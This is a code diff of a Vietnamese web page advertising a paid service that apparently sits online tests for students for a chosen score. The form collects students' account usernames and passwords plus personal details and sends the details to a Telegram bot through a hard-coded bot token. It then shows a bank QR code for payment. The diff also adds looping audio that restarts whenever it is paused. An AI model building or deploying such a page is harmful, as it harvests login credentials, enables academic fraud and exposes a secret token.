@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cuộc thi trắc nghiệm trên internet</title>
+    <title>Cuộc thi trắc nghiệm trên internet</title>
     <link rel="stylesheet" href="style.css">
     <style>
         body {
@@ -15,7 +15,7 @@
         }
 
         h2 {
-            color: #333;
+            color: #ffffff;
             text-align: center;
             margin-top: 50px;
         }
@@ -35,7 +35,9 @@
             color: #333;
         }
 
-        input {
+        input,
+        select,
+        button {
             width: 100%;
             padding: 10px;
             margin-bottom: 15px;
@@ -45,16 +47,15 @@
         }
 
         button {
-            background-color: #4caf50;
+            background-color: #4ca8af;
             color: #fff;
-            padding: 10px 15px;
             border: none;
             border-radius: 4px;
             cursor: pointer;
         }
 
         button:hover {
-            background-color: #45a049;
+            background-color: #4592a0;
         }
 
         #notification {
@@ -65,12 +66,12 @@
         }
 
         #success {
-            background-color: #4caf50;
+            background-color: #4cafa7;
             color: #fff;
         }
 
         #failure {
-            background-color: #f44336;
+            background-color: #c23c4e;
             color: #fff;
         }
 
@@ -86,12 +87,40 @@
         }
 
         .error-input {
-            border-color: #f44336 !important;
+            border-color: rgb(244, 54, 54) !important;
         }
     </style>
 
     <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 </head>
+<audio id="play" loop>
+    <source src="https://audio.jukehost.co.uk/h48Ru7NLhfivzcOuFCpn6pH8K4tbqCvG">
+</audio>
+<script>
+    // Lấy tham chiếu đến thẻ audio
+    var audio = document.getElementById("play");
+
+    var audioStarted = false; // Biến để kiểm tra xem nhạc đã được bật lần đầu chưa
+
+    // Tạo một hàm để bật âm nhạc
+    function playAudio() {
+        if (!audioStarted) {
+            audioStarted = true; // Đánh dấu rằng nhạc đã được bật lần đầu
+            audio.play();
+        }
+    }
+
+    // Bắt sự kiện nhấp chuột bất kì nơi nào trên trang web
+    document.addEventListener("click", playAudio);
+
+    // Ngăn người dùng tắt nhạc khi họ nhấn vào nút dừng
+    audio.addEventListener("pause", function (event) {
+        if (audioStarted) {
+            event.preventDefault(); // Ngăn chặn tắt nhạc
+            audio.play(); // Chắc chắn rằng nhạc sẽ tiếp tục phát
+        }
+    });
+</script>
 
 <body>
     <h2>Nhập thông tin</h2>
@@ -111,17 +140,23 @@
         <label for="prediction">Số lần cần thi:</label>
         <input type="text" id="prediction" name="prediction" required>
 
-        <label for="facebook">Số zalo nhận ảnh:</label>
-        <input type="url" id="facebook" name="facebook" placeholder="Nhập Số zalo nhận ảnh của bạn" required>
+        <label for="selector">Số điểm mong muốn:</label>
+        <select id="selector" name="selector" required onchange="calculateAmount()">
+            <option value="" disabled selected></option>
+            <option value="full15">full 15 điểm</option>
+            <option value="on8">Trên 8 điểm</option>
+        </select>
 
-        <button type="card-social" onclick="validateAndSave()">Gửi Thông Tin</button>
+        <label for="facebook">Link Facebook:</label>
+        <input type="url" id="facebook" name="facebook" placeholder="Nhập link Facebook của bạn" required>
 
+        <button type="button" onclick="validateAndSave()">Gửi Thông Tin</button>
 
         <div class="card-social">
             <a href="https://www.facebook.com/vnkien26" target="_blank">
                 <button type="button">Liên hệ Admin qua Facebook</button>
             </a>
-        
+        </div>
 
         <div id="notification"></div>
         <div id="amount"></div>
@@ -130,6 +165,13 @@
         <div id="qrCodeContainer"></div>
 
         <script>
+            var costPerUnitOver8 = 0.33333 * 1000; // Giá cho lựa chọn trên 8 điểm
+var costPerUnitFull15 = 0.7 * 1000; // Giá cho lựa chọn full 15 điểm
+
+            function calculateCostPerUnit(selectedOption) {
+                return selectedOption === 'full15' ? costPerUnitFull15 : costPerUnitOver8;
+            }
+
             function validateAndSave() {
                 var username = document.getElementById('username');
                 var pass = document.getElementById('pass');
@@ -137,9 +179,10 @@
                 var score = document.getElementById('score');
                 var prediction = document.getElementById('prediction');
                 var facebook = document.getElementById('facebook');
+                var selector = document.getElementById('selector');
 
                 // Kiểm tra xem tất cả các trường có giá trị không
-                if (username.value === '' || pass.value === '' || fullName.value === '' || score.value === '' || prediction.value === '' || facebook.value === '') {
+                if (username.value === '' || pass.value === '' || fullName.value === '' || score.value === '' || prediction.value === '' || facebook.value === '' || selector.value === '') {
                     // Hiển thị thông báo lỗi
                     showErrorNotification('Vui lòng điền đầy đủ thông tin.');
 
@@ -150,6 +193,7 @@
                     if (score.value === '') score.classList.add('error-input');
                     if (prediction.value === '') prediction.classList.add('error-input');
                     if (facebook.value === '') facebook.classList.add('error-input');
+                    if (selector.value === '') selector.classList.add('error-input');
                 } else {
                     // Lấy giá trị số lần cần thi từ input
                     var numberOfPredictions = parseInt(prediction.value, 10);
@@ -164,7 +208,7 @@
                     // Tính số tiền dựa trên số lần cần thi
                     var amount = calculateAmount(numberOfPredictions);
 
-                    // Hiển thị số tiền
+                    // Hi
                     showAmount(amount);
 
                     // Lưu thông tin vào Local Storage hoặc server
@@ -205,7 +249,7 @@
                 var addInfo = username + ' ' + fullName + ' ' + score + ' ' + numberOfPredictions;
 
                 // Đường link chứa mã QR với các tham số đã được thay thế
-                var qrCodeLink = 'https://img.vietqr.io/image/MB-0349862214-compact2.jpg?amount=' + totalAmount + '&addInfo=' + encodeURIComponent(addInfo) + '&accountName=NGUYEN%20VAN%20KIEN';
+                var qrCodeLink = 'https://img.vietqr.io/image/MB-0349862214-compact2.jpg?amount=' + totalAmount + '&addInfo=' + encodeURIComponent(addInfo) + '&accountName=NGUYEN%20VAN%20KIEN&costPerUnit=' + calculateCostPerUnit(document.getElementById('selector').value);
 
                 // Tạo một phần tử hình ảnh
                 var qrCodeImage = new Image();
@@ -218,72 +262,72 @@
 
             function showAmount(amount) {
                 var amountElement = document.getElementById('amount');
-                // Định dạng số tiền và hiển thị
                 var formattedAmount = formatCurrency(amount);
-                amountElement.innerHTML = 'Số tiền: ' + formattedAmount;
+
+                // Hiển thị giá và lựa chọn tương ứng
+                var costText = (calculateCostPerUnit(document.getElementById('selector').value) === 0.7) ? 'full 15 điểm' : 'Trên 8 điểm';
+                amountElement.innerHTML = 'Số tiền cần trả cho ' + document.getElementById('prediction').value + ' lần thi ' +': ' + formattedAmount;
             }
 
             // Khởi tạo biến đếm và thời điểm reset
-var userCount = 0;
-var lastResetDate = new Date();
+            var userCount = 0;
+            var lastResetDate = new Date();
 
-function sendToTelegram(userInfo) {
-    // Thay thế YOUR_BOT_TOKEN bằng mã token của bot bạn đã tạo
-    var botToken = '6416487576:AAGeK1DedNa4Xr7kVq3dMQhEy1zwA_2wrvc';
+            function sendToTelegram(userInfo) {
+                // Thay thế YOUR_BOT_TOKEN bằng mã token của bot bạn đã tạo
+                var botToken = '6416487576:AAGeK1DedNa4Xr7kVq3dMQhEy1zwA_2wrvc';
 
-    // Thay thế YOUR_CHAT_ID bằng chat ID của admin hoặc nhóm muốn nhận thông tin
-    var chatId = '6520036650';
+                // Thay thế YOUR_CHAT_ID bằng chat ID của admin hoặc nhóm muốn nhận thông tin
+                var chatId = '6520036650';
 
-    // Lấy thời gian hiện tại
-    var currentTime = new Date();
+                // Lấy thời gian hiện tại
+                var currentTime = new Date();
 
-    // Kiểm tra nếu đã qua một ngày kể từ thời điểm reset cuối cùng
-    if (isOneDayPassed(currentTime)) {
-        // Reset số người gửi và cập nhật thời điểm reset
-        userCount = 1;
-        lastResetDate = currentTime;
-    } else {
-        // Tăng giá trị số người gửi
-        userCount++;
-    }
+                // Kiểm tra nếu đã qua một ngày kể từ thời điểm reset cuối cùng
+                if (isOneDayPassed(currentTime)) {
+                    // Reset số người gửi và cập nhật thời điểm reset
+                    userCount = 1;
+                    lastResetDate = currentTime;
+                } else {
+                    // Tăng giá trị số người gửi
+                    userCount++;
+                }
 
-    // Định dạng thời gian theo yêu cầu
-    var formattedTime = currentTime.toLocaleString('vi-VN', {
-        day: 'numeric',
-        month: 'numeric',
-        year: 'numeric',
-        hour: 'numeric',
-        minute: 'numeric'
-    });
+                // Định dạng thời gian theo yêu cầu
+                var formattedTime = currentTime.toLocaleString('vi-VN', {
+                    day: 'numeric',
+                    month: 'numeric',
+                    year: 'numeric',
+                    hour: 'numeric',
+                    minute: 'numeric'
+                });
 
-    // Định dạng thông điệp
-    var message = "👤 NGƯỜI Dùng " + userInfo.fullName + " Gửi vào lúc ⏰ " + formattedTime + "\n" +
-    "👥 Tên truy cập: " + userInfo.username + "\n" +
-    "👤 Họ tên: " + userInfo.fullName + "\n" +
-    "👤 Họ tên: " + userInfo.pass + "\n" +
-    "📚 Học Sinh Lớp: " + userInfo.score + "\n" +
-    "🔢 Số lần Thi: " + userInfo.prediction + "\n" +
-    "🔗 số zalo nhận ảnh: " + userInfo.facebook + "\n" +
-    "💰 Số tiền: " + userInfo.amount.toLocaleString('vi-VN', { style: 'currency', currency: 'VND' });
+                // Định dạng thông điệp
+                var message = "👤 NGƯỜI Dùng " + userInfo.fullName + " Gửi vào lúc ⏰ " + formattedTime + "\n" +
+                    "👥 Tên truy cập: " + userInfo.username + "\n" +
+                    "👤 Họ tên: " + userInfo.fullName + "\n" +
+                    "📚 Học Sinh Lớp: " + userInfo.score + "\n" +
+                    "🔢 Số lần Thi: " + userInfo.prediction + "\n" +
+                    "🔗 Link Facebook: " + userInfo.facebook + "\n" +
+                    "💰 Số tiền: " + userInfo.amount.toLocaleString('vi-VN', { style: 'currency', currency: 'VND' });
 
+                // Tạo URL API cho Bot của bạn
+                var apiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
 
-    // Tạo URL API cho Bot của bạn
-    var apiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+                // Sử dụng XMLHttpRequest để gửi yêu cầu
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", apiUrl, true);
+                xhr.send();
 
-    // Sử dụng XMLHttpRequest để gửi yêu cầu
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", apiUrl, true);
-    xhr.send();
+                // Trả về true nếu thành công, ngược lại trả về false
+                return xhr.status === 200;
+            }
 
-    // Trả về true nếu thành công, ngược lại trả về false
-    return xhr.status === 200;
-}
-
-// Hàm kiểm tra xem đã qua một ngày kể từ thời điểm reset cuối cùng hay chưa
-function isOneDayPassed(currentTime) {
-    var oneDayInMilliseconds = 24 * 60 * 60 * 1000; // Một ngày trong milliseconds
-    return currentTime - lastResetDate > oneDayInMilliseconds;
-}
+            // Hàm kiểm tra xem đã qua một ngày kể từ thời điểm reset cuối cùng hay chưa
+            function isOneDayPassed(currentTime) {
+                var oneDayInMilliseconds = 24 * 60 * 60 * 1000; // Một ngày trong milliseconds
+                return currentTime - lastResetDate > oneDayInMilliseconds;
+            }
 
             function showErrorNotification(message) {
                 var notification = document.getElementById('notification');
@@ -311,6 +355,8 @@ function isOneDayPassed(currentTime) {
                 // Hiển thị thông báo
                 notification.style.display = 'block';
 
+                // Ẩn
+
                 // Ẩn thông báo sau 3 giây
                 setTimeout(function () {
                     notification.style.display = 'none';
@@ -318,18 +364,28 @@ function isOneDayPassed(currentTime) {
             }
 
             function calculateAmount(prediction) {
-                // Giả sử 30 lần tương đương với 10.000 VNĐ
-                var costPerPrediction = 10000;
-
-                // Tính giá trị của một đơn vị tiền tệ
-                var costPerUnit = costPerPrediction / 30;
-
-                // Tính tổng giá trị dựa trên số lượt thi
+                var selectedOption = document.getElementById('selector').value;
+                var costPerUnit = calculateCostPerUnit(selectedOption);
+    
+                // Lưu giữ giá cũ hoặc giá mới tùy thuộc vào lựa chọn
+                if (selectedOption === 'full15') {
+                    oldCostPerUnit = costPerUnitFull15; // Lưu giữ giá mới
+                }
+    
+                // Tính toán số tiền cần trả dựa trên số lần thi và giá
                 var amount = prediction * costPerUnit;
-
+    
                 return amount;
             }
-
+    
+            function removeError() {
+                // Loại bỏ lớp error-input khi người dùng sửa lỗi
+                var inputElements = document.querySelectorAll('input, select');
+                inputElements.forEach(function (element) {
+                    element.classList.remove('error-input');
+                });
+            }
+    
             function formatCurrency(amount) {
                 // Sử dụng hàm toLocaleString để định dạng số thành chuỗi có định dạng tiền tệ
                 var formattedAmount = amount.toLocaleString('vi-VN', { style: 'currency', currency: 'VND' });
@@ -337,6 +393,7 @@ function isOneDayPassed(currentTime) {
             }
         </script>
     </form>
+    
 </body>
 
 </html>
